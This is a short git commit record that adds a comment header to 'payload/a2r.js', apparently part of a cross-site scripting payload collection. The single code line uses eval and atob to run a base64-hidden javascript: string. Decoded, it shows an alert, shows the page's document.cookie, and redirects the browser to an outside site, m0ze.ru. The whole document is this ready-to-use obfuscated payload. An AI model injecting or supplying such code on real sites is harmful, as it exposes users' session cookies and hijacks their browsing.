c55c4f84f11739055dc9f9a9231e5c7e64b856bd
m0ze <80548182+m0ze@users.noreply.github.com>
2021-03-18 09:40:19 +0300

    Update a2r.js

--- payload/a2r.js
+++ payload/a2r.js
@@ -1,1 +1,4 @@
+/*!
+- [ JavaScript ] Two alerts & redirect payload
+*/
 eval(atob(`amF2YXNjcmlwdDphbGVydChgbTB6ZWApO2FsZXJ0KGRvY3VtZW50LmNvb2tpZSk7d2luZG93LmxvY2F0aW9uPSdodHRwczovL20wemUucnUvJzs=`));
